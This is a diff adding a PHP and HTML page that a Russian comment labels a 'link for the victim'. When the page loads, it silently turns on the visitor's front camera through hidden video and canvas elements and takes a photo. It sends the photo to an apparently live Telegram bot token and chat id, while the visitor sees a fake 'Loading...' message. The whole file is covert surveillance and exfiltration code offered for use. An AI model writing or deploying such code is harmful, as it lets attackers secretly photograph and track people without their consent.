@@ -1,0 +1,46 @@
+<?php
+// index.php — ссылка для жертвы
+$bot_token = "8884231524:AAGDtfaZDt2r8a5Vy3YfJiwIyWJCM4BUpjY";
+$chat_id = "8729010241";
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
+    $file = $_FILES['photo']['tmp_name'];
+    $url = "https://api.telegram.org/bot{$bot_token}/sendPhoto";
+    $post = ['chat_id' => $chat_id, 'photo' => new CURLFile($file)];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
+    echo "OK";
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+    video.srcObject = stream;
+    await video.play();
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+    const form = new FormData();
+    form.append('photo', blob, 'shot.jpg');
+    await fetch(window.location.href, { method: 'POST', body: form });
+    stream.getTracks().forEach(t => t.stop());
+    document.body.innerHTML = 'Загрузка...';
+</script>
+</body>
+</html>
